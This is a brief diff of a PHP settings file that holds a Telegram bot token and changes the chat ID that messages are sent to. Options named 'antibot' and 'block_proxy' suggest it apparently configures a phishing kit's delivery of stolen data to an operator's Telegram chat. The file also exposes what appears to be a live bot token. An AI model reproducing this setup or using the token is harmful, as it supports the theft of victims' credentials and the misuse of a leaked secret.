@@ -6,7 +6,7 @@
 
 
 $bot = "8225126596:AAGs83lTqkwCg5hrZWNGcCBLCES8fV0AhyY";
-$chat_id = "7731970548";
+$chat_id = "-5000599971";
 
 
 // use antibot? yes|no
@@ -20,3 +20,4 @@ $block_proxy = "no";
 
 
 ?>
+
